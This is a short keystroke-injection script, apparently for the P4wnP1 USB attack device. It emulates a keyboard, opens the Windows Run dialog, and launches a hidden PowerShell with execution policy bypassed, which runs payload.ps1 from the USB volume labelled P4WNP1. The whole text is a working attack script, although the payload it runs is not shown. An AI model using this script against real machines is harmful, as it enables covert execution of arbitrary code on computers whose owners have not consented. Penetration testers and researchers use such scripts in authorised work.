layout('us'); // US keyboard layout
typingSpeed(0,0)
press("GUI r");
delay(500);
type("cmd /C start /MIN powershell -executionpolicy Bypass .((gwmi win32_volume -f 'label=''P4WNP1''').Name+'\\payload\\payload.ps1')\n")
delay(1000);
